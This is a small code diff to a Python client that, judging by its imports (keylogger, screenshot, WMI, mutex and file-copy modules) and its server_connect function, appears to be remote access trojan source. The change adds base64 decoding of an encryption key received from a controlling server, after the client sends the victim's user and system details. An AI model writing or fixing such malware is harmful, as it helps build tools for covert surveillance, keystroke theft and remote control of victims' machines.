@@ -1,3 +1,4 @@
+import base64
 import socket, os, sys, platform, time, ctypes, subprocess, pyscreeze, threading, pynput.keyboard, wmi, json
 import win32api, winerror, win32event
 from shutil import copyfile
@@ -108,7 +109,7 @@ def server_connect():
 
     objSocket.send(json.dumps(arrUserInfo).encode())
 
-    objEncryptor = Fernet(objSocket.recv(intBuff).decode())
+    objEncryptor = Fernet(base64.b64decode(objSocket.recv(intBuff)))
 
 
 # function to receive data
